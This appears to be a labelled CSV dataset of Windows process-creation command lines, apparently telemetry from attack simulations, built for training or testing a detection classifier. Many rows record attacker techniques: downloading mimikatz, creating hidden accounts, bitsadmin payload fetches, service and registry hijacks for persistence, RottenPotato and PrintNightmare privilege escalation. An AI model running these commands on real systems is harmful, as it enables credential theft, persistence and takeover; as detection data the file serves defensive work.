"text","labels"
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe """"""""""""""""C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe""""""""""""""""  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip '.strip()) -> (C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe """"""""""""""""C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"""""""""""""""" --type=crashpad-handler """"""""""""""""--user-data-dir=C:\\\\Users\\\\admmig\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data"""""""""""""""" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler """"""""""""""""--database=C:\\\\Users\\\\admmig\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Crashpad"""""""""""""""" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=96.0.4664.110 """"""""""""""""--annotation=exe=C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"""""""""""""""" --annotation=plat=Win64 """"""""""""""""--annotation=prod=Microsoft Edge"""""""""""""""" --annotation=ver=96.0.1054.62 --initial-client-data=0xf0,0xf4,0xf8,0xa4,0xfc,0x7ffa3209a740,0x7ffa3209a750,0x7ffa3209a760'.strip())","""31"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\taskkill.exe taskkill  /IM """"""""""""""""msedge.exe"""""""""""""""" /F'.strip())","""31"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\timeout.exe timeout  3 '.strip())","""31"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\SecurityHealthHost.exe C:\\\\Windows\\\\System32\\\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding'.strip())","""31"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\setspn.exe SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\\\\honey-pot1'.strip())","""32"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\setspn.exe setspn  -T offsec -Q */*'.strip())","""32"""
"(C:\\\\TOOLS\\\\CreateHiddenAccount_upx_v0.2.exe CreateHiddenAccount_upx_v0.2.exe  -u 3teamssixf -p Passw0rd'.strip())","""33"""
"(C:\\\\Windows\\\\System32\\\\net.exe net  user toto3 @#(*kjh@(@Jd /add'.strip())","""33"""
"(C:\\\\Windows\\\\System32\\\\net1.exe C:\\\\Windows\\\\system32\\\\net1  user toto3 @#(*kjh@(@Jd /add'.strip())","""33"""
"(C:\\\\Windows\\\\System32\\\\netdom.exe netdom query pdc'.strip())","""33"""
"(C:\\\\Windows\\\\regedit.exe regedit /s .sTRmxJkRFoTFaPRXBeavZhjaAYNvpYko.reg'.strip())","""33"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\bitsadmin.exe bitsadmin  /transfer hackingarticles https://www.ma-neobanque.com/wp-content/uploads/2020/11/carte-max-premium.jpg c:\\\\ignite.png'.strip())","""34"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\dllhost.exe C:\\\\Windows\\\\system32\\\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'.strip())","""14"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe) -> (C:\\\\Windows\\\\System32\\\\net.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\net.exe"""""""""""""""" start MSSQL$RADAR /m'.strip())","""7;35"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe) -> (C:\\\\Windows\\\\System32\\\\net.exe """"""""""""""""C:\\\\Windows\\\\system32\\\\net.exe"""""""""""""""" start MSSQL$RADAR /m'.strip()) -> (C:\\\\Windows\\\\System32\\\\net1.exe C:\\\\Windows\\\\system32\\\\net1 start MSSQL$RADAR /m'.strip())","""7;35"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Program Files\\\\Microsoft SQL Server\\\\Client SDK\\\\ODBC\\\\110\\\\Tools\\\\Binn\\\\SQLCMD.EXE sqlcmd  -S .\\\\RADAR,2020'.strip())","""35"""
"(C:\\\\Windows\\\\System32\\\\services.exe) -> (C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL12.RADAR\\\\MSSQL\\\\Binn\\\\sqlservr.exe """"""""""""""""C:\\\\Program Files\\\\Microsoft SQL Server\\\\MSSQL12.RADAR\\\\MSSQL\\\\Binn\\\\sqlservr.exe"""""""""""""""" -sRADAR'.strip())","""35"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\dllhost.exe C:\\\\Windows\\\\system32\\\\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'.strip())","""35"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\reg.exe REG  ADD """"""""""""""""HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\W32Time"""""""""""""""" /v FailureCommand /t REG_SZ /d """"""""""""""""C:\\\\tmp\\\\pentestlab.exe""""""""""""""""'.strip())","""36"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\reg.exe reg  add """"""""""""""""HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\XblGameSave\\\\Security"""""""""""""""" /v Security /t REG_BINARY /d fe340ead'.strip())","""36"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\reg.exe reg  add """"""""""""""""HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\xboxgip"""""""""""""""" /v ImagePath /t REG_SZ /d """"""""""""""""C:\\\\tmp\\\\pentestlab.exe""""""""""""""""'.strip())","""36"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\sc.exe sc  \\\\\\\\fs02\\\\ create hacker-testl binPath=""""""""""""""""virus.exe""""""""""""""""'.strip())","""36"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\sc.exe sc  config xboxgip binPath= """"""""""""""""C:\\\\windows\\\\system32\\\\pentestlab.exe""""""""""""""""'.strip())","""36"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\sc.exe sc  failure W32Time command= """"""""""""""""\\\\""""""""""""""""c:\\\\Windows\\\\system32\\\\pentestlab.exe\\\\""""""""""""""""""""""""""""""""'.strip())","""36"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\sc.exe sc  sdset xboxgip """"""""""""""""D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)""""""""""""""""'.strip())","""36"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\sc.exe sc.exe  create hijackservice binpath= """"""""""""""""cmd.exe /k tscon 2 /dest:rdp-tcp#5""""""""""""""""'.strip())","""36"""
"(C:\\\\Windows\\\\System32\\\\sc.exe sc  create hacker-testl3 binPath=""""""""""""""""3virus.exe"""""""""""""""" '.strip())","""36"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Users\\\\admmig\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\21.180.0905.0007\\\\FileCoAuth.exe """"""""""""""""C:\\\\Users\\\\admmig\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\21.180.0905.0007\\\\FileCoAuth.exe"""""""""""""""" -Embedding'.strip())","""36"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\dllhost.exe C:\\\\Windows\\\\system32\\\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'.strip())","""36"""
"(C:\\\\Windows\\\\System32\\\\taskhostex.exe taskhostex.exe '.strip())","""36"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\netsh.exe netsh  add helper  mimikatz.exe'.strip())","""37"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\dnscmd.exe dnscmd.exe  /config /serverlevelplugindll """"""""""""""""C:\\\\TOOLS\\\\Mimikatz-fev-2020\\\\mimilib.dll""""""""""""""""'.strip())","""37"""
"(C:\\\\TOOLS\\\\MSFRottenPotato.exe MSFRottenPotato.exe'.strip())","""39"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\net.exe net  use \\\\\\\\printnightmare.gentilkiwi.com\\\\ipc$ /user:gentilguest password'.strip())","""41"""
"(C:\\\\Windows\\\\System32\\\\cmd.exe) -> (C:\\\\Windows\\\\System32\\\\rundll32.exe rundll32  printui.dll,PrintUIEntry /in /n""""""""""""""""\\\\\\\\printnightmare.gentilkiwi.com\\\\Kiwi Legit Printer""""""""""""""""'.strip())","""41"""
"(C:\\\\Windows\\\\System32\\\\spoolsv.exe) -> (C:\\\\Windows\\\\System32\\\\cmd.exe """"""""""""""""cmd.exe""""""""""""""""'.strip())","""41"""
"(C:\\\\Windows\\\\System32\\\\spoolsv.exe) -> (C:\\\\Windows\\\\System32\\\\cmd.exe """"""""""""""""cmd.exe""""""""""""""""'.strip()) -> (C:\\\\Windows\\\\System32\\\\conhost.exe \\\\??\\\\C:\\\\Windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1'.strip())","""41"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\drvinst.exe DrvInst.exe """"""""""""""""1"""""""""""""""" """"""""""""""""0"""""""""""""""" """"""""""""""""SWD\\\\PRINTENUM\\\\{F98719DA-2EAC-4BAB-B347-A1C4BA29442C}"""""""""""""""" """""""""""""""""""""""""""""""" """""""""""""""""""""""""""""""" """"""""""""""""4f51462e7"""""""""""""""" """"""""""""""""0000000000000000""""""""""""""""'.strip())","""41"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\drvinst.exe DrvInst.exe """"""""""""""""4"""""""""""""""" """"""""""""""""d"""""""""""""""" """"""""""""""""C:\\\\Windows\\\\system32\\\\spool\\\\{C3445CE2-E050-40AC-972D-6D9E24646E8F}\\\\prnge001.inf"""""""""""""""" """"""""""""""""9"""""""""""""""" """"""""""""""""4d6061107"""""""""""""""" """"""""""""""""0000000000000F34"""""""""""""""" """"""""""""""""WinSta0\\\\Default"""""""""""""""" """"""""""""""""0000000000000E50"""""""""""""""" """"""""""""""""208"""""""""""""""" """"""""""""""""C:\\\\Windows\\\\system32\\\\spool\\\\{C3445CE2-E050-40AC-972D-6D9E24646E8F}""""""""""""""""'.strip())","""41"""
"(C:\\\\Windows\\\\System32\\\\svchost.exe) -> (C:\\\\Windows\\\\System32\\\\drvinst.exe DrvInst.exe """"""""""""""""4"""""""""""""""" """"""""""""""""d"""""""""""""""" """"""""""""""""C:\\\\Windows\\\\system32\\\\spool\\\\{FB290F8D-907E-440F-B071-82ECFEE67D2B}\\\\ntprint.inf"""""""""""""""" """"""""""""""""9"""""""""""""""" """"""""""""""""4d2985097"""""""""""""""" """"""""""""""""0000000000000AEC"""""""""""""""" """"""""""""""""WinSta0\\\\Default"""""""""""""""" """"""""""""""""0000000000000D8C"""""""""""""""" """"""""""""""""208"""""""""""""""" """"""""""""""""C:\\\\Windows\\\\system32\\\\spool\\\\{FB290F8D-907E-440F-B071-82ECFEE67D2B}""""""""""""""""'.strip())","""41"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg1"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg10"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg100"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg103"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg104"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg109"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg11"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg114"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg115"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg118"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg12"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg120"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg13"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg132"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg137"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg138"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg14"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg140"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg146"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg15"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg151"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg155"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg158"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg16"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg17"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg179"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg186"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg188"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg19"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg191"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg2"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg21"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg22"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg23"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg239"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg24"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg25"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg26"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg28"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg3"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg30"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg31"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg32"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg33"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg34"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg35"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg36"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg38"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg4"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg40"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg41"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg42"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg45"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg46"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg47"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg48"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg5"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
"(C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe powershell  -command """"""""""""""""Get-Service """"""""""""""""seg57"""""""""""""""" | select -Expand DisplayName |out-file -append tmp_payload.txt""""""""""""""""'.strip())","""7;42"""
